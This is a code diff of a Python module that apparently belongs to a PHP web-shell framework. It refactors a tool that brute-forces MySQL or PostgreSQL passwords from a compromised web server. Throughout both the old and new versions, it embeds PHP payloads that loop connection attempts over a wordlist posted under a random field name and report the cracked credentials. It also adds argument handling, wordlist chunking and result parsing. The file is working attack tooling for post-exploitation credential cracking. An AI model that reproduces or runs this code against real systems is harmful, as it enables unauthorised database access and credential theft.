@@ -1,150 +1,124 @@
-'''
-Created on 22/ago/2011
-
-@author: norby
-'''
-
-from core.module import Module, ModuleException
-from core.vector import VectorList, Vector
+from core.moduleprobe import ModuleProbe
+from core.moduleexception import ProbeException, ProbeSucceed
+from core.savedargparse import SavedArgumentParser as ArgumentParser
+from ast import literal_eval
+from argparse import SUPPRESS
+from os import sep
+from string import ascii_lowercase
 from random import choice
-from math import ceil
-from core.parameters import ParametersList, Parameter as P
+from re import compile
 
-classname = 'Sql'
+WARN_CHUNKSIZE_TOO_BIG = 'Reduce it bruteforcing remote hosts to speed up the process' 
+WARN_NO_SUCH_FILE = 'No such file or permission denied'
+WARN_NO_WORDLIST = 'Impossible to load a valid word list, use -wordfile or -wordlist'
+WARN_STARTLINE = 'Wrong start line'
+WARN_NOT_CALLABLE = 'Function not callable, use -dbms to change db management system'
 
 
 def chunks(l, n):
     return [l[i:i+n] for i in range(0, len(l), n)]
 
+def uniq(seq):
+    seen = set()
+    seen_add = seen.add
+    return [ x for x in seq if x not in seen and not seen_add(x)]
 
-class Sql(Module):
-    '''Bruteforce sql user
-    '''
+class Sql(ModuleProbe):
+    """Bruteforce SQL username"""
+    
 
-    vectors = VectorList([
-            Vector('shell.php', 'brute_sql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"];
-ini_set('mysql.connect_timeout',1);
-foreach(split('[\n]+',$w) as $pwd) {
-$c=@$m("$h", "$u", "$pwd");
-if($c){
-print("+" . $u . ":" . $pwd . "\n");
-break;
-}
-}
-mysql_close($m);
-""")
-            ])
-
-    params = ParametersList('Bruteforce single SQL user using local wordlist', vectors,
-            P(arg='dbms', help='DBMS', choices=['mysql', 'postgres'], required=True, pos=0),
-            P(arg='user', help='SQL user to bruteforce', required=True, pos=1),
-            P(arg='lpath', help='Path of local wordlist', required=True, pos=2),
-            P(arg='sline', help='Start line of local wordlist', default='all', pos=3),
-            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=4))
-
-
-    def __init__( self, modhandler , url, password):
-
-        self.chunksize = 5000
-        self.substitutive_wl = []
-        Module.__init__(self, modhandler, url, password)
-
-
-    def set_substitutive_wl(self, substitutive_wl=[]):
-        """Cleaned after use"""
-        self.substitutive_wl = substitutive_wl
-
-
-    def run_module( self, mode, user, filename, start_line, host):
+    def _set_vectors(self):
+        self.support_vectors.add_vector('check_connect','shell.php',  "(is_callable('$dbms_connect') && print(1)) || print(0);")
+        self.support_vectors.add_vector( 'mysql','shell.php', [ """ini_set('mysql.connect_timeout',1);
+    foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
+    $c=@mysql_connect("$hostname", "$username", "$pwd");
+    if($c){
+    print("+ $username:" . $pwd . "\n");
+    break;
+    }
+    }mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"])
+        self.support_vectors.add_vector('postgres','shell.php',  [ """foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
+    $c=@pg_connect("host=$hostname user=$username password=" . $pwd . " connect_timeout=1");
+    if($c){
+    print("+ $username:" . $pwd . "\n");
+    break;
+    }
+    }pg_close();""", "-post", "{\'$post_field\' : \'$data\' }"])
+        
+    
+    def _set_args(self):
+        self.argparser.add_argument('username', help='SQL username to bruteforce')
+        self.argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
+        self.argparser.add_argument('-wordfile', help='Local wordlist path')
+        self.argparser.add_argument('-startline', help='Start line of local wordlist', type=int, default=0)
+        self.argparser.add_argument('-chunksize', type=int, default=5000)
+        self.argparser.add_argument('-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=literal_eval, default=[])
+        self.argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
 
 
+        
 
-        if start_line == 'all':
-            start_line = 0
-
-        if 'localhost' not in host and '127.0.0.1' not in host:
-            self.chunksize = 20
-
-        if self.substitutive_wl:
-            wl_splitted = self.substitutive_wl[:]
-            self.substitutive_wl = []
+    def _prepare_probe(self):
+        
+        
+        # Check chunk size
+        if (self.args['hostname'] not in ('127.0.0.1', 'localhost')) and self.args['chunksize'] > 20:
+            self.mprint('Chunk size %i: %s' % (self.args['chunksize'], WARN_CHUNKSIZE_TOO_BIG))
+            
+        # Load wordlist
+        wordlist = self.args['wordlist']
+        if not wordlist:
+            if self.args['wordfile']:
+                try:
+                    local_file = open(self.args['wordfile'], 'r')
+                except Exception, e:
+                    raise ProbeException(self.name,  '\'%s\' %s' % (self.args['wordfile'], WARN_NO_SUCH_FILE))
+                else:
+                    wordlist = local_file.read().split('\n')
+                    
+        # If loaded, cut it from startline
+        if not wordlist:
+            raise ProbeException(self.name, WARN_NO_WORDLIST)   
+        if self.args['startline'] < 0 or self.args['startline'] > len(wordlist)-1:
+            raise ProbeException(self.name, WARN_STARTLINE)   
+            
+        
+        wordlist = wordlist[self.args['startline']:]
+            
+        # Clean it
+        wordlist = filter(None, uniq(wordlist))
+            
+        # Then divide in chunks
+        chunksize = self.args['chunksize']
+        wlsize = len(wordlist)
+        if chunksize > 0 and wlsize > chunksize:
+            self.args['wordlist'] = chunks(wordlist, chunksize)
         else:
+            self.args['wordlist'] = [ wordlist ]
 
-            try:
-                wordlist = open(filename, 'r')
-            except Exception, e:
-                raise ModuleException(self.name, "%s" % (str(e)))
+        
+        dbms_connect = 'mysql_connect' if self.args['dbms'] == 'mysql' else 'pg_connect'
+        
+        if self.support_vectors.get('check_connect').execute({ 'dbms_connect' : dbms_connect }) != '1':
+            raise ProbeException(self.name,  '\'%s\' %s' % (dbms_connect, WARN_NOT_CALLABLE))            
+    
+    def _probe(self):
 
-            wl_splitted = [ w.strip() for w in wordlist.read().split() ]
-
-
-        rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
-
-        vectors = self._get_default_vector2()
-        if not vectors:
-            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
-
-        for vector in vectors:
-            response = self.__execute_payload(vector, [mode, host, user, rand_post_name, start_line, wl_splitted])
-            if response != None:
-                self.params.set_and_check_parameters({'vector' : vector.name})
-                return response
-
-
-
-    def __execute_payload(self, vector, parameters):
-
-        if parameters[0] == 'mysql':
-            parameters[0] = "mysql_connect"
-        else:
-            parameters[0] = "pg_connect"
-
-
-        rand_post_name = parameters[3]
-        start_line = int(parameters[4])
-        wl = parameters[5][start_line:]
-        wl_length = len(wl)
-
-        if wl_length > self.chunksize:
-            wl_chunks = chunks(wl, self.chunksize)
-            self.mprint('[%s] Splitting wordlist of %i words in %i chunks of %i words.' % (self.name, wl_length, len(wl_chunks), len(wl_chunks[0])))
-        else:
-            wl_chunks = [ wl ]
-            self.mprint('[%s] Using wordlist of %i words' % (self.name, wl_length))
-
-        if self.modhandler.load('shell.php').run({0 : "if(function_exists('%s')) echo(1);" % parameters[0]}) != '1':
-            self.mprint('[%s] Skipping vector %s: %s not available' % (self.name, vector.name, parameters[0]))
-            return
-
-        i=0
-        for wl in wl_chunks:
-
-            joined_wl='\n'.join(wl)
-
-            payload = self.__prepare_payload(vector, parameters[:-2])
-
-            self.modhandler.load(vector.interpreter).set_post_data({rand_post_name : joined_wl})
-            response = self.modhandler.load(vector.interpreter).run({ 0 : payload})
-
-            if response:
-                if response.startswith('+'):
-                    return "[%s] FOUND! (%s)" % (self.name,response[1:])
-            else:
-                self.mprint("Tried password #%i: (%s:%s) ..." % (i*len(wl), parameters[2], wl[-1]))
-
-            i+=1
-
-        self.mprint('[%s] Password of \'%s\' not found. Check dbms availability or try with another username and wordlist' % (self.name, parameters[2]));
-
-    def __prepare_payload( self, vector, parameters ):
-
-        if vector.payloads[0].count( '%s' ) == len(parameters):
-            return vector.payloads[0] % tuple(parameters)
-        else:
-            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
-
-
-
-
-
-
+        post_field = ''.join(choice(ascii_lowercase) for x in range(4))
+        user_pwd_re = compile('\+ (.+):(.+)$')
+        
+        for chunk in self.args['wordlist']:
+            
+            joined_chunk='\\n'.join(chunk)
+            args_formats = { 'hostname' : self.args['hostname'], 'username' : self.args['username'], 'post_field' : post_field, 'data' : joined_chunk }
+            self.mprint("%s: from '%s' to '%s'..." % (self.args['username'], chunk[0], chunk[-1]))
+            result = self.support_vectors.get(self.args['dbms']).execute(args_formats)  
+            if result:
+                user_pwd_matched = user_pwd_re.findall(result)
+                if user_pwd_matched and len(user_pwd_matched[0]) == 2:
+                    self._result = [ user_pwd_matched[0][0], user_pwd_matched[0][1]]
+                    raise ProbeSucceed(self.name, 'Password found')
+                    
+                    
+                
+                
